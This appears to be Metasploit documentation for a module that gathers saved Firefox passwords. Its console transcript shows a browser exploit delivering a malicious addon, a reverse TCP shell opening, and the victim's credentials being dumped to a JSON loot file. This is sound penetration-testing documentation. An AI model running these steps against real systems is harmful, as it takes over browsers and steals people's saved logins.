## Vulnerable Application

  This post-exploitation module allows the collection of saved Firefox passwords from a Firefox privileged javascript shell.

## Verification Steps

  1. Start `msfconsole`
  2. Get privileged javascript session
  3. Do: `use post/firefox/gather/passwords`
  4. Do: `set SESSION <session id>`
  5. Do: `run`
  6. You should be able to see all saved Firefox passwords in the loot file in JSON format

## Options

  - **SESSION** - The session to run the module on.

  - **TIMEOUT** - Maximum time (seconds) to wait for a response. The default value is 90.

## Scenarios

  **Obtain a privileged javascript shell and gather saved Firefox passwords**

  To be able to use this module, a privileged javascript shell is needed. It can be obtained by using a javascript privilege exploit like `exploit/multi/browser/firefox_proto_crmfrequest`, `exploit/multi/browser/firefox_proxy_prototype` or others.
  In the example case of the `firefox_proto_crmfrequest` exploit use `set TARGET 0` to use a javascript shell.

  ```
  msf > use exploit/multi/browser/firefox_proto_crmfrequest
  msf exploit(firefox_proto_crmfrequest) > set TARGET 0
  TARGET => 0
  msf exploit(firefox_proto_crmfrequest) > run
  [*] Exploit running as background job.
  msf exploit(firefox_proto_crmfrequest) >
  [*] Started reverse TCP handler on 192.168.2.117:4444
  [*] Using URL: http://0.0.0.0:8080/nbHsSeXAfjr
  [*] Local IP: http://192.168.2.117:8080/nbHsSeXAfjr
  [*] Server started.
  [*] Gathering target information for 192.168.2.117
  [*] Sending HTML response to 192.168.2.117
  [*] Sending HTML
  [*] Sending the malicious addon
  [*] Command shell session 1 opened (192.168.2.117:4444 -> 192.168.2.117:35100) at 2016-10-08 00:33:09 +0200

  msf exploit(firefox_proto_crmfrequest) > use post/firefox/gather/passwords
  msf post(passwords) > set SESSION 1
  SESSION => 1
  msf post(passwords) > run

  [*] Running the privileged javascript...
  [+] Saved 1 passwords to /home/user/.msf4/loot/20161008003433_default_192.168.2.117_firefox.password_070261.txt
  [*] Post module execution completed
  ```

  The loot file then contains all passwords in json format, like so:

  ```
  [  
     {  
        "password":"1234",
        "passwordField":"pwd",
        "username":"admin",
        "usernameField":"log",
        "httpRealm":"",
        "formSubmitURL":"https://example.com",
        "hostname":"https://example.com"
     }
  ]
  ```